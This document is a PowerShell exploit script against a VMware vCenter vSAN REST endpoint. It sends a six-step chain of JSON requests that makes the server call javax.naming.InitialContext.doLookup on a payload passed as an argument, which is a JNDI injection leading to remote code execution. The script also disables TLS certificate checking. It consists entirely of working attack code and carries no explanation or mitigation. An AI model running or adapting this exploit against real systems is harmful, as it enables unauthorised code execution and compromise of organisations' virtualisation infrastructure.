
$target = $argv[1]
$payload = $argv[2]

$baseuri = "/ui/h5-vsan/rest/proxy/service/&vsanQueryUtil_setDataService"
$uris = @('/setTargetObject', '/setStaticMethod', '/setTargetMethod', '/setArguments', '/prepare', '/invoke')
$headers = @{'Content-Type' = 'application/json'}

$stage_setTargetObject = @'
{"methodInput":[null]}
'@
$stage_setStaticMethod = @'
{"methodInput":["javax.naming.InitialContext.doLookup"]}
'@

$stage_setTargetMethod = @'
{"methodInput":["doLookup"]}
'@

$stage_setArguments = '{"methodInput":[["' + $payload + '"]]}'

$stage_prepare = @'
{"methodInput":[]}
'@

Write-Host "[*] start init TargetObject"

if (-not("dummy" -as [type])) {
    add-type -TypeDefinition @"
using System;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;

public static class Dummy {
    public static bool ReturnTrue(object sender,
        X509Certificate certificate,
        X509Chain chain,
        SslPolicyErrors sslPolicyErrors) { return true; }

    public static RemoteCertificateValidationCallback GetDelegate() {
        return new RemoteCertificateValidationCallback(Dummy.ReturnTrue);
    }
}
"@
}

[System.Net.ServicePointManager]::ServerCertificateValidationCallback = [dummy]::GetDelegate()
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

function Send-Request($RelUri, $Json) {
    $url = "https://" + $target + $baseuri + $RelUri

    Write-Host $url
    Invoke-RestMethod -Method POST -ContentType "application/json" -Body $Json -ErrorVariable RestError -ErrorAction SilentlyContinue -uri $url | ConvertTo-Json -Depth 5

    if ($RestError)
    {
        Write-Host "[*] exploit failed!"

        $HttpStatusCode = $RestError.ErrorRecord.Exception.Response.StatusCode.value__
        $HttpStatusDescription = $RestError.ErrorRecord.Exception.Response.StatusDescription
        Write-Host "Http Status Code: $($HttpStatusCode) `nHttp Status Description: $($HttpStatusDescription)"

        Write-Host -NoNewLine 'Press any key to continue...';
        $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown');
        exit 1
    }
}

# init TargetObject
Send-Request $uris[0] $stage_setTargetObject

# Step2 setStaticMethod
Send-Request $uris[1] $stage_setStaticMethod

# Step3 setTargetMethod
Send-Request $uris[2] $stage_setTargetMethod

# Step4 setArguments
Send-Request $uris[3] $stage_setArguments

# Step5 prepare
Send-Request $uris[4] $stage_prepare

# Step6 invoke
Send-Request $uris[5] $stage_prepare
